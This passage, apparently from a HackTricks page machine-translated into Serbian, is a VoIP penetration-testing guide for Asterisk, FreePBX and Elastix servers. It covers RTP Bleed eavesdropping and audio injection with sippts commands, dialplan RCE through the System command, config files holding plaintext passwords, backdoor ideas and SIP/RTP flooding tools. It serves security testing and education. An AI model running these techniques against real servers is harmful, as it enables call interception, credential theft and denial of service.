**RTCPBleed** je veliki bezbednosni problem koji utiƒçe na Asterisk-bazirane VoIP servere (objavljen 2017. godine). Ranjivost omoguƒáava **RTP (Real Time Protocol) saobraƒáaju**, koji nosi VoIP razgovore, da bude **presretnut i preusmeren od strane bilo koga na Internetu**. To se de≈°ava zato ≈°to RTP saobraƒáaj zaobilazi autentifikaciju prilikom navigacije kroz NAT (Network Address Translation) vatrozidove.

RTP proksi poku≈°avaju da re≈°e **NAT ograniƒçenja** koja utiƒçu na RTC sisteme tako ≈°to proksiraju RTP tokove izmeƒëu dve ili vi≈°e strana. Kada je NAT u upotrebi, RTP proksi softver ƒçesto ne mo≈æe da se oslanja na RTP IP i port informacije dobijene putem signalizacije (npr. SIP). Stoga, niz RTP proksija je implementirao mehanizam gde se takav **IP i port tuplet automatski uƒçi**. To se ƒçesto radi inspekcijom dolaznog RTP saobraƒáaja i oznaƒçavanjem izvornog IP i porta za bilo koji dolazni RTP saobraƒáaj kao onog na koji treba odgovoriti. Ovaj mehanizam, koji se mo≈æe nazvati "naƒçin uƒçenja", **ne koristi nikakvu vrstu autentifikacije**. Stoga **napadaƒçi** mogu **slati RTP saobraƒáaj ka RTP proksiju** i primati proksirani RTP saobraƒáaj koji je namenjen pozivaocu ili pozvanom u toku RTP toka. Ovu ranjivost nazivamo RTP Bleed jer omoguƒáava napadaƒçima da primaju RTP medijske tokove koji su namenjeni za legitimne korisnike.

Jo≈° jedno zanimljivo pona≈°anje RTP proksija i RTP stekova je da ponekad, **ƒçak i ako nisu ranjivi na RTP Bleed**, oni ƒáe **prihvatiti, proslediti i/ili obraditi RTP pakete iz bilo kojeg izvora**. Stoga napadaƒçi mogu slati RTP pakete koji im mogu omoguƒáiti da ubace svoj medij umesto legitimnog. Ovaj napad nazivamo RTP injekcija jer omoguƒáava ubacivanje nelegitimnih RTP paketa u postojeƒáe RTP tokove. Ova ranjivost mo≈æe se naƒái i u RTP proksijima i na krajnjim taƒçkama.

Asterisk i FreePBX su tradicionalno koristili **`NAT=yes` pode≈°avanje**, koje omoguƒáava RTP saobraƒáaju da zaobiƒëe autentifikaciju, potencijalno dovodeƒái do nedostatka zvuka ili jednosmernog zvuka na pozivima.

Za vi≈°e informacija proverite [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** iz [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed detektuje RTP Bleed ranjivost slanjem RTP tokova.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed otkriva RTP Bleed ranjivost slanjem RTCP strimova.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood koristi RTP Bleed ranjivost slanjem RTP tokova.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject koristi RTP Bleed ranjivost za injectovanje audio fajla (WAV format).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

U Asterisk-u nekako uspete da **dodate pravila ekstenzije i ponovo ih uƒçitate** (na primer, kompromitovanjem ranjivog web menad≈æera), moguƒáe je dobiti RCE koristeƒái **`System`** komandu.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Postoji komanda pod nazivom **`Shell`** koja se mo≈æe koristiti **umesto `System`** za izvr≈°avanje sistemskih komandi ako je to potrebno.

{% hint style="warning" %}
Ako server **ne dozvoljava kori≈°ƒáenje odreƒëenih karaktera** u **`System`** komandi (kao u Elastix-u), proverite da li web server dozvoljava **kreiranje fajlova na neki naƒçin unutar sistema** (kao u Elastix-u ili trixbox-u), i koristite to da **napravite skriptu za backdoor** i zatim koristite **`System`** da **izvr≈°ite** tu **skriptu**.
{% endhint %}

#### Zanimljivi lokalni fajlovi i dozvole

* **`sip.conf`** -> Sadr≈æi lozinku SIP korisnika.
* Ako **Asterisk server radi kao root**, mogli biste kompromitovati root.
* **mysql root korisnik** mo≈æda **nema lozinku**.
* ovo se mo≈æe koristiti za kreiranje novog mysql korisnika kao backdoor.
* **`FreePBX`**
* **`amportal.conf`** -> Sadr≈æi lozinku administratora web panela (FreePBX).
* **`FreePBX.conf`** -> Sadr≈æi lozinku korisnika FreePBXuser koji se koristi za pristup bazi podataka.
* ovo se mo≈æe koristiti za kreiranje novog mysql korisnika kao backdoor.
* **`Elastix`**
* **`Elastix.conf`** -> Sadr≈æi nekoliko lozinki u ƒçistom tekstu kao ≈°to su mysql root lozinka, IMAPd lozinka, lozinka web administratora.
* **NSeveral folderi** ƒáe pripadati kompromitovanom asterisk korisniku (ako ne radi kao root). Ovaj korisnik mo≈æe ƒçitati prethodne fajlove i takoƒëe kontroli≈°e konfiguraciju, tako da mo≈æe naterati Asterisk da uƒçita druge backdoored binarne fajlove kada se izvr≈°e.

### RTP Injekcija

Moguƒáe je umetnuti **`.wav`** u razgovore koristeƒái alate kao ≈°to su **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) i **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Ili mo≈æete koristiti skripte sa [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) da **skenirate razgovore** (**`rtpscan.pl`**), po≈°aljete `.wav` u razgovor (**`rtpsend.pl`**) i **ubacite buku** u razgovor (**`rtpflood.pl`**).

### DoS

Postoji nekoliko naƒçina da se poku≈°a postiƒái DoS na VoIP serverima.

* **`SIPPTS flood`** iz [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood ≈°alje neograniƒçene poruke cilju.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** iz [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping pravi SIP ping da vidi vreme odgovora servera.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS IAX protokol koji koristi Asterisk.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Alat za izvoƒëenje SIP/SDP INVITE poruka preplavljivanja preko UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): ≈†alje nekoliko dobro formiranih RTP paketa. Potrebno je znati RTP portove koji se koriste (prvo ih snimiti).
* [**SIPp**](https://github.com/SIPp/sipp): Omoguƒáava analizu i generisanje SIP saobraƒáaja, tako da se mo≈æe koristiti i za DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP ≈°vajcarski no≈æ. Takoƒëe se mo≈æe koristiti za izvoƒëenje SIP napada.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### OS Ranljivosti

Najlak≈°i naƒçin da se instalira softver kao ≈°to je Asterisk je da se preuzme **OS distribucija** koja ga veƒá ima instaliranog, kao ≈°to su: **FreePBX, Elastix, Trixbox**... Problem sa njima je ≈°to kada poƒçnu da rade, sistem administratori mo≈æda **neƒáe ponovo a≈æurirati** i **ranljivosti** ƒáe se otkrivati s vremenom.

## Reference

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{% hint style="success" %}
Uƒçite i ve≈æbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Uƒçite i ve≈æbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr≈°ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
